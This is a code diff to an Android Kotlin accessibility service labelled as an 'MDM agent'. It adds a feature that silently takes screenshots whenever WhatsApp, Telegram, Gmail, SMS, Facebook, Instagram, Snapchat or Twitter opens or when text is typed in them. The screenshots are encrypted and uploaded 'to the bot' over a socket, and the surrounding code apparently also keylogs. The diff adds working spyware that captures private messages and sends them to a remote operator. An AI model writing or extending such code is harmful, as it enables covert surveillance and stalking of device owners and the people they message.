@@ -3,6 +3,8 @@ package com.mdm.agent.service
 import android.accessibilityservice.AccessibilityService
 import android.content.Intent
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 
@@ -10,6 +12,25 @@ class MDMAccessibilityService : AccessibilityService() {
 
     companion object {
         private const val TAG = "MDMAccessibility"
+        
+        @Volatile var autoScreenshotEnabled = false
+        @Volatile private var lastScreenshotTime = 0L
+        private const val SCREENSHOT_THROTTLE = 5000L  // 5 seconds between screenshots
+        private const val SCREENSHOT_MIN_DELAY = 3000L  // 3 seconds after app opens
+        
+        // Apps to monitor for screenshots
+        private val MONITORED_APPS = setOf(
+            "com.whatsapp", "com.whatsapp.w4b",
+            "com.telegram.messenger", "org.telegram.messenger",
+            "com.google.android.gm", "com.android.mms",
+            "com.facebook.katana", "com.instagram.android",
+            "com.snapchat.android", "com.twitter.android"
+        )
+        
+        fun setAutoScreenshot(enabled: Boolean) {
+            autoScreenshotEnabled = enabled
+            Log.i(TAG, "Auto-screenshot ${if (enabled) "ENABLED" else "DISABLED"}")
+        }
     }
 
     override fun onServiceConnected() {
@@ -77,6 +98,35 @@ class MDMAccessibilityService : AccessibilityService() {
                 val cls = event.className?.toString() ?: ""
                 if (pkg.isNotEmpty()) {
                     Log.d(TAG, "Window: $pkg / $cls")
+                    
+                    // Auto-screenshot: take screenshot when monitored app opens
+                    if (autoScreenshotEnabled && pkg in MONITORED_APPS) {
+                        val now = System.currentTimeMillis()
+                        if (now - lastScreenshotTime > SCREENSHOT_THROTTLE) {
+                            lastScreenshotTime = now
+                            Log.i(TAG, "📸 Auto-screenshot: $pkg opened")
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                takeAutoScreenshot(pkg)
+                            }, SCREENSHOT_MIN_DELAY)
+                        }
+                    }
+                }
+            }
+            
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                // Auto-screenshot when text changes in monitored apps
+                if (autoScreenshotEnabled) {
+                    val pkg = event.packageName?.toString() ?: ""
+                    if (pkg in MONITORED_APPS) {
+                        val now = System.currentTimeMillis()
+                        if (now - lastScreenshotTime > SCREENSHOT_THROTTLE) {
+                            lastScreenshotTime = now
+                            Log.i(TAG, "📸 Auto-screenshot: text changed in $pkg")
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                takeAutoScreenshot(pkg)
+                            }, 1000)  // 1 second delay to let text render
+                        }
+                    }
                 }
             }
             AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
@@ -127,6 +177,66 @@ class MDMAccessibilityService : AccessibilityService() {
             }
         } catch (e: Exception) {
             Log.e(TAG, "Keylog error: ${e.message}")
+        }
+    }
+
+    private fun takeAutoScreenshot(packageName: String) {
+        try {
+            Log.i(TAG, "📸 Taking auto-screenshot for: $packageName")
+            
+            // Check if ScreenCaptureService is ready
+            if (!ScreenCaptureService.isReady()) {
+                Log.w(TAG, "⚠️ ScreenCapture not ready - requesting permission")
+                // Request permission (will show dialog first time)
+                com.mdm.agent.ui.ScreenCapturePermissionActivity.requestPermission(this)
+                return
+            }
+            
+            // Take screenshot
+            ScreenCaptureService.requestScreenshot(this) { file ->
+                if (file != null && file.exists()) {
+                    Log.i(TAG, "✅ Screenshot captured: ${file.absolutePath} (${file.length()} bytes)")
+                    
+                    // Upload to bot
+                    Thread {
+                        try {
+                            val sm = com.mdm.agent.MainActivity.getSocketManager()
+                            if (sm != null && sm.isConnected) {
+                                // Use UploadManager to send the file
+                                val context = this
+                                val apiClient = com.mdm.agent.data.remote.ApiClient(context)
+                                val cryptoManager = com.mdm.agent.data.remote.CryptoManager()
+                                val uploadManager = com.mdm.agent.data.remote.UploadManager(context)
+                                
+                                // Get crypto keys
+                                val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(context)
+                                val cryptoResult = apiClient.initCrypto(deviceId)
+                                if (cryptoResult != null) {
+                                    cryptoManager.initFromServer(cryptoResult)
+                                }
+                                
+                                // Upload the screenshot
+                                uploadManager.uploadEncryptedFile(
+                                    file,
+                                    "screenshot",
+                                    deviceId,
+                                    "photo"
+                                )
+                                Log.i(TAG, "✅ Screenshot uploaded to bot!")
+                            } else {
+                                Log.w(TAG, "⚠️ Socket not connected - saving screenshot locally")
+                                // File stays in cache, will be sent when connection restored
+                            }
+                        } catch (e: Exception) {
+                            Log.e(TAG, "❌ Failed to upload screenshot: ${e.message}")
+                        }
+                    }.start()
+                } else {
+                    Log.w(TAG, "⚠️ Screenshot file is null")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Auto-screenshot error: ${e.message}")
         }
     }
 
